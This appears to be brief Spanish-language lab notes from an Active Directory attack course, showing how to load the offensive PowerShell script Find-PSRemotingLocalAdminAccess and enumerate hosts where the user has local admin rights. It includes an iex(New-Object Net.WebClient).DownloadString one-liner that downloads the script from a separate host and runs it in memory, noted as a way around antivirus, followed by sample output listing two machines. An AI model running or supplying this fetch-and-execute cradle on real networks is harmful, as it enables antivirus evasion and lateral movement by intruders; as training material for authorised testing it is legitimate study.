# Find-PSRemotingLocalAdminAccess

Cargar modulo.

Import-Module .\Find-PSRemotingLocalAdminAccess.ps1  //sin AV, importar modulo

iex(New-Object Net.WebClient).DownloadString('http://172.16.99.38:8000/Find-PSRemotingLocalAdminAccess.ps1')        //cargar a memoria

PS C:> Find-PSRemotingLocalAdminAccess  //ejecutar script
dcorp-std738
dcorp-adminsrv

